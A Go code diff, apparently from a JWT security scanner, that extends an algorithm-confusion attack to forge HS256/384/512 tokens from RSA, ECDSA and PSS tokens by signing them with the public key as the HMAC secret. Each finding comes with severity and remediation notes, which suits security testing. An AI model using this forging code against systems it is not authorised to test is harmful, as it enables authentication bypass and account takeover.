@@ -323,32 +323,51 @@ func (a *Attacker) NoneAlgorithmAttack(token *Token) ([]*Vulnerability, error) {
 	return vulns, nil
 }
 
-// AlgorithmConfusionAttack attempts RS256 to HS256 confusion attack
+// AlgorithmConfusionAttack attempts asymmetric-to-symmetric algorithm confusion attack.
+// Covers RS256/384/512, ES256/384/512, and PS256/384/512 → HS256/384/512.
 func (a *Attacker) AlgorithmConfusionAttack(token *Token, publicKey string) ([]*Vulnerability, error) {
-	if token.Header.Alg != "RS256" && token.Header.Alg != "RS384" && token.Header.Alg != "RS512" {
+	// All asymmetric algorithms that are vulnerable to key confusion
+	asymmetricAlgs := map[string]bool{
+		"RS256": true, "RS384": true, "RS512": true,
+		"ES256": true, "ES384": true, "ES512": true,
+		"PS256": true, "PS384": true, "PS512": true,
+	}
+	if !asymmetricAlgs[token.Header.Alg] {
 		return nil, nil
 	}
 
 	var vulns []*Vulnerability
 
-	// Change algorithm to HS256 and sign with public key
-	newHeader := *token.Header
-	newHeader.Alg = "HS256"
-
-	// The public key becomes the HMAC secret
-	newToken, err := Sign(&newHeader, token.Claims, []byte(publicKey))
-	if err != nil {
-		return nil, err
+	// Try confusion with each HMAC variant
+	hmacVariants := []struct {
+		alg  string
+		desc string
+	}{
+		{"HS256", "HS256"},
+		{"HS384", "HS384"},
+		{"HS512", "HS512"},
 	}
 
-	vulns = append(vulns, &Vulnerability{
-		Type:        AttackAlgConfusion,
-		Description: "RS256 to HS256 algorithm confusion - signed with public key as HMAC secret",
-		Severity:    "critical",
-		Token:       newToken,
-		Original:    token.Raw,
-		Remediation: "Use separate code paths for symmetric (HMAC) and asymmetric (RSA/ECDSA) algorithms. Never use public keys as symmetric secrets.",
-	})
+	for _, variant := range hmacVariants {
+		newHeader := *token.Header
+		origAlg := newHeader.Alg
+		newHeader.Alg = variant.alg
+
+		// The public key becomes the HMAC secret
+		newToken, err := Sign(&newHeader, token.Claims, []byte(publicKey))
+		if err != nil {
+			continue
+		}
+
+		vulns = append(vulns, &Vulnerability{
+			Type:        AttackAlgConfusion,
+			Description: fmt.Sprintf("%s to %s algorithm confusion - signed with public key as HMAC secret", origAlg, variant.desc),
+			Severity:    "critical",
+			Token:       newToken,
+			Original:    token.Raw,
+			Remediation: "Use separate code paths for symmetric (HMAC) and asymmetric (RSA/ECDSA/PSS) algorithms. Never use public keys as symmetric secrets.",
+		})
+	}
 
 	return vulns, nil
 }
